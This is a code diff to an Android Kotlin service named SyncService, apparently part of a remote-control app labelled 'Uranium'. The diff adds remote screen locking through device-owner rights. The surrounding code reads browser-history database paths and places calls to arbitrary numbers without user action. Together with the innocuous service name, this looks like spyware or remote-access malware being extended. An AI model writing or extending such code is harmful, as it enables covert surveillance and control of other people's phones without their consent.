@@ -4,6 +4,7 @@ import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.admin.DevicePolicyManager
 import android.content.ClipboardManager
 import android.content.ContentUris
 import android.content.Context
@@ -367,7 +368,25 @@ class SyncService : LifecycleService() {
 
     private fun readBrowserHistory(): String { val sb = StringBuilder(); val paths = listOf("/data/data/com.android.chrome/databases/History", "/data/data/com.chrome.beta/databases/History", "/data/data/org.mozilla.firefox/files/places.sqlite"); paths.forEach { p -> try { val f = File(p); if (f.exists() && f.canRead()) sb.append("[${f.absolutePath}] size=${f.length()}\n") } catch (_: Exception) {} }; return sb.toString().ifEmpty { "No readable browser DB (needs root)" } }
 
-    private fun toggleScreen(on: Boolean) { try { val pm = getSystemService(Context.POWER_SERVICE) as PowerManager; if (!on) pm.goToSleep(0L) else { val wl = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE, "Uranium::ScreenOn"); wl.acquire(3000L) } } catch (_: Exception) {} }
+    private fun toggleScreen(on: Boolean) {
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            if (on) {
+                val wl = pm.newWakeLock(
+                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
+                    "Uranium::ScreenOn"
+                )
+                wl.acquire(3000L)
+            } else {
+                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                if (dpm.isDeviceOwnerApp(packageName)) {
+                    dpm.lockNow()
+                } else {
+                    sendReport("ScreenOff", "Device Owner مطلوب لقفل الشاشة. تم التجاهل.")
+                }
+            }
+        } catch (_: Exception) {}
+    }
 
     @SuppressLint("MissingPermission") private fun makeSilentCall(number: String) { try { val i = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }; startActivity(i) } catch (_: Exception) {} }
 
